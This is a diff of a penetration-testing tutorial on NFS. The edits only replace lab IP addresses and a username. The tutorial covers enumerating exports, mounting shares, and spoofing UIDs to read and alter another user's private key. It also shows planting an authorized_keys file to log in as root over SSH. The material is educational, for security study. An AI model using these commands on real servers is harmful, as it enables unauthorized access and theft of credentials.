@@ -87,7 +87,7 @@ NFS exports are configured via `/etc/exports`. The default file is empty:
 
 The format: `<path> <client>(<options>) [<client>(<options>) ...]`
 
-A real entry: `/mnt/nfs 10.129.14.0/24(sync,no_subtree_check)` - exports `/mnt/nfs` to anyone in the `/24` subnet with synchronous I/O and no subtree checking.
+A real entry: `/mnt/nfs 10.0.14.0/24(sync,no_subtree_check)` - exports `/mnt/nfs` to anyone in the `/24` subnet with synchronous I/O and no subtree checking.
 
 Per-host options:
 
@@ -125,7 +125,7 @@ The most common real-world finding: a share intended for internal team sharing, 
 ### Portmapper / RPC enumeration
 
 ```shell
-sudo nmap 10.129.14.128 -p111,2049 -sV -sC
+sudo nmap 10.0.14.128 -p111,2049 -sV -sC
 ```
 
 ```
@@ -147,7 +147,7 @@ The `rpcinfo` NSE script enumerates the portmapper. `mountd` and `nlockmgr` ride
 ### Comprehensive NSE enumeration
 
 ```shell
-sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
+sudo nmap --script nfs* 10.0.14.128 -sV -p111,2049
 ```
 
 ```
@@ -160,7 +160,7 @@ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
 | rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
 |
 | nfs-showmount:
-|_  /mnt/nfs 10.129.14.0/24
+|_  /mnt/nfs 10.0.14.0/24
 | nfs-statfs:
 |   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
 |_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
@@ -171,12 +171,12 @@ That `id_rsa` owned by UID 0 is the kind of find that ends engagements.
 ### Export listing
 
 ```shell
-showmount -e 10.129.14.128
+showmount -e 10.0.14.128
 ```
 
 ```
-Export list for 10.129.14.128:
-/mnt/nfs 10.129.14.0/24
+Export list for 10.0.14.128:
+/mnt/nfs 10.0.14.0/24
 ```
 
 `showmount -a` (active mounts) and `showmount -d` (directories currently mounted by clients) provide additional intel on some servers, though many disable these.
@@ -185,7 +185,7 @@ Export list for 10.129.14.128:
 
 ```shell
 mkdir target-NFS
-sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+sudo mount -t nfs 10.0.14.128:/ ./target-NFS/ -o nolock
 ```
 
 `nolock` skips the `nlockmgr` handshake, useful when the lock service is firewalled or slow. Adding `vers=3` or `vers=4` forces a specific NFS version.
@@ -193,7 +193,7 @@ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
 To mount a specific export rather than the root:
 
 ```shell
-sudo mount -t nfs 10.129.14.128:/mnt/nfs ./target-NFS/ -o nolock
+sudo mount -t nfs 10.0.14.128:/mnt/nfs ./target-NFS/ -o nolock
 ```
 
 ### Walking the tree
@@ -204,15 +204,15 @@ ls -l target-NFS/mnt/nfs/
 
 ```
 total 16
--rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
--rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
+-rw-r--r-- 1 jdoe jdoe 1872 Sep 25 00:55 jdoe.priv
+-rw-r--r-- 1 jdoe jdoe  348 Sep 25 00:55 jdoe.pub
 -rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
 -rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
 -rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
 ```
 
 Two things to notice:
-- `cry0l1t3:cry0l1t3` - files owned by a user named `cry0l1t3`. If you have UID matching `cry0l1t3` on your machine, you have full access; otherwise the file is readable but not writable.
+- `jdoe:jdoe` - files owned by a user named `jdoe`. If you have UID matching `jdoe` on your machine, you have full access; otherwise the file is readable but not writable.
 - `root:root` - files owned by root. With `root_squash` enabled, your local root can read but not modify these. Without `root_squash`, you can do whatever you want.
 
 To see numeric UIDs/GIDs directly:
@@ -223,8 +223,8 @@ ls -ln target-NFS/mnt/nfs/
 
 ```
 total 16
--rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
--rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
+-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 jdoe.priv
+-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 jdoe.pub
 -rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
 -rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
 -rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
@@ -238,14 +238,14 @@ To read/write as a specific UID:
 
 ```shell
 # Create local user with matching UID
-sudo useradd -u 1000 cry0l1t3 -m
+sudo useradd -u 1000 jdoe -m
 
 # Switch to that user
-sudo su - cry0l1t3
+sudo su - jdoe
 
 # Now your file operations on the mount run as UID 1000
-cat target-NFS/mnt/nfs/cry0l1t3.priv
-echo "added by attacker" >> target-NFS/mnt/nfs/cry0l1t3.priv
+cat target-NFS/mnt/nfs/jdoe.priv
+echo "added by attacker" >> target-NFS/mnt/nfs/jdoe.priv
 ```
 
 This is the textbook NFS abuse pattern. UID-based auth means the client decides who they are, and the server has no way to verify.
@@ -278,7 +278,7 @@ sudo chown root:root target-NFS/mnt/nfs/.ssh/authorized_keys
 sudo chmod 600 target-NFS/mnt/nfs/.ssh/authorized_keys
 
 # Now SSH as root with your key
-ssh -i ~/.ssh/id_rsa root@10.129.14.128
+ssh -i ~/.ssh/id_rsa root@10.0.14.128
 ```
 
 For this to work the NFS export must be `/root/` or include `/root/.ssh/`. Sometimes it's a different exported directory but with a symlink trail that lets you write to `/root/.ssh/` indirectly.
